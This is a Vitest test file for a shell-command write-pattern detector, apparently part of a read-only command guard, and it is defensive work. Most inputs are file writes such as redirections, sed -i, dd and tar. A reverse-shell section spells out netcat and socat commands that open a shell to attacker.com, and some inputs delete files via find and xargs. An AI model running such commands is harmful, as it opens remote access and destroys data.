import { describe, it, expect } from "vitest";
import { WritePatternDetector } from "../../../src/readonly-checker/write-patterns/write-pattern-detector.js";

describe("WritePatternDetector", () => {
  const detector = new WritePatternDetector();

  describe("redirection detection", () => {
    it("should detect > stdout redirection", () => {
      expect(detector.detect("ls > file.txt")).toBe(true);
      expect(detector.detect("cat file.txt > output.txt")).toBe(true);
    });
    it("should detect >> append redirection", () => {
      expect(detector.detect("ls >> file.txt")).toBe(true);
      expect(detector.detect("cat file.txt >> output.txt")).toBe(true);
    });
    it("should detect 2> stderr redirection", () => {
      expect(detector.detect("ls 2> error.log")).toBe(true);
      expect(detector.detect("cat file.txt 2>> errors.log")).toBe(true);
    });
    it("should detect &> combined redirection", () => {
      expect(detector.detect("ls &> output.log")).toBe(true);
    });
    it("should allow 2>/dev/null (not a write)", () => {
      expect(detector.detect("sudo cat /proc/net/ipt_stat_filter 2>/dev/null")).toBe(false);
      expect(detector.detect("cat file.txt 2>/dev/null || echo missing")).toBe(false);
      expect(detector.detect("ls 2>&1")).toBe(false);
      expect(detector.detect("command 2>/dev/zero")).toBe(false);
    });
  });

  describe("process substitution", () => {
    it("should detect >(write) process substitution", () => {
      expect(detector.detect("diff <(ls dir1) >(sort)")).toBe(true);
      expect(detector.detect("diff <(ls dir1) >(sort > /tmp/out)")).toBe(true);
    });
    it("should allow <(read) process substitution", () => {
      expect(detector.detect("diff <(ls dir1) <(ls dir2)")).toBe(false);
    });
  });

  describe("here-string", () => {
    it("should detect <<< here-string", () => {
      expect(detector.detect("<<< echo hello")).toBe(true);
      expect(detector.detect("command <<< data")).toBe(true);
    });
  });

  describe("sed in-place", () => {
    it("should detect sed -i", () => {
      expect(detector.detect("sed -i 's/x/y/g' file.txt")).toBe(true);
      expect(detector.detect("sed -ibak 's/x/y/g' file.txt")).toBe(true);
    });
    it("should detect sed --in-place", () => {
      expect(detector.detect("sed --in-place 's/x/y/g' file.txt")).toBe(true);
    });
    it("should detect sed -n w write", () => {
      expect(detector.detect('sed -n "w /tmp/test.txt" <<< "hello"')).toBe(true);
      expect(detector.detect("sed -n 'w /tmp/out' file.txt")).toBe(true);
    });
  });

  describe("find -exec", () => {
    it("should detect find -exec", () => {
      expect(detector.detect("find . -exec touch {} \\;")).toBe(true);
      expect(detector.detect("find /tmp -exec rm {} \\;")).toBe(true);
    });
    it("should detect find -execdir", () => {
      expect(detector.detect("find . -execdir rm {} \\;")).toBe(true);
      expect(detector.detect("find . -execdir touch {} \\;")).toBe(true);
    });
  });

  describe("xargs", () => {
    it("should block xargs", () => {
      expect(detector.detect("xargs touch")).toBe(true);
      expect(detector.detect("find . | xargs rm")).toBe(true);
    });
  });

  describe("cp stdin", () => {
    it("should detect cp with /dev/stdin", () => {
      expect(detector.detect("cp /dev/stdin /tmp/out")).toBe(true);
    });
    it("should detect cp with -", () => {
      expect(detector.detect("cp -")).toBe(true);
      expect(detector.detect("cat file | cp -")).toBe(true);
    });
  });

  describe("dd output", () => {
    it("should detect dd of=", () => {
      expect(detector.detect("dd if=/dev/zero of=/tmp/test bs=1M")).toBe(true);
      expect(detector.detect("dd of=/tmp/out if=/dev/zero bs=1M")).toBe(true);
      expect(detector.detect("dd if=/dev/zero of=./file bs=1M")).toBe(true);
      expect(detector.detect("dd if=/dev/zero of=../file bs=1M")).toBe(true);
    });
  });

  describe("tar create", () => {
    it("should detect tar cf", () => {
      expect(detector.detect("tar cf archive.tar .")).toBe(true);
      expect(detector.detect("tar czf archive.tar.gz dir/")).toBe(true);
      expect(detector.detect("tar cJf archive.tar.xz dir/")).toBe(true);
    });
    it("should detect tar --create", () => {
      expect(detector.detect("tar --create --file archive.tar .")).toBe(true);
      expect(detector.detect("tar -c --file archive.tar .")).toBe(true);
    });
  });

  describe("interpreter writes", () => {
    it("should detect python open() write", () => {
      expect(detector.detect("python3 -c 'open(\\'/tmp/x\\',\\'w\\')'")).toBe(true);
    });
    it("should detect python os.system", () => {
      expect(detector.detect("python3 -c 'import os; os.system(\\'ls\\')'")).toBe(true);
    });
    it("should detect python subprocess", () => {
      expect(detector.detect("python3 -c 'import subprocess; subprocess.run([\\'ls\\'])'")).toBe(true);
    });
    it("should detect perl file write", () => {
      expect(detector.detect("perl -e 'open(F,\\'>/tmp/x\\'); print F \\\"hi\\\"'")).toBe(true);
    });

  });

  describe("reverse shell detection", () => {
    it("should detect nc reverse shell", () => {
      expect(detector.detect("nc -e /bin/sh attacker.com 4444")).toBe(true);
    });
    it("should detect socat reverse shell", () => {
      expect(detector.detect("socat exec:/bin/sh,pty tcp:attacker.com:4444")).toBe(true);
    });
    it("should allow nc/socat read commands", () => {
      expect(detector.detect("nc -zv host 80")).toBe(false);
      expect(detector.detect("socat TCP:host:80 -")).toBe(false);
    });
  });

  describe("false positives", () => {
    it("should not false positive on bpftrace with open in name", () => {
      expect(detector.detect("bpftrace -e 'tracepoint:syscalls:sys_enter_open { printf(\\\"%s\\\", args->filename); }'")).toBe(false);
    });
    it("should not false positive on systemtap with write in probe name", () => {
      expect(detector.detect("systemtap -e 'probe syscall.write { exit() }'")).toBe(false);
    });
    it("should allow quoted > in strings", () => {
      expect(detector.detect('echo "data > file"')).toBe(false);
      expect(detector.detect('grep ">" file.txt')).toBe(false);
    });
  });
});
